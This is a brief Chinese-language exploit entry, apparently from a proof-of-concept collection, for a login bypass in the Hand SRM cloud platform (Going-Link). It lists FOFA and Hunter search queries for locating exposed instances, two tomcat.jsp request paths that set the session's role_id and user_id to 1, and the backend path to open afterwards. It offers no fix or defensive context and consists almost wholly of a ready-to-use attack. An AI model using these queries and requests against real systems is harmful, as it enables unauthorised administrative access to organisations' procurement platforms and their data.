# 汉得SRM tomcat.jsp 登陆绕过漏洞

## 网络测绘

fofa: app="汉得SRM云平台(Going-Link)"

hunter: app.name="汉得 SRM Going-Link"

## POC / EXP

验证POC (Tomcat session操控)

```
/tomcat.jsp?dataName=role_id&dataValue=1
/tomcat.jsp?dataName=user_id&dataValue=1
```

访问跳转后台

```
/main.screen
```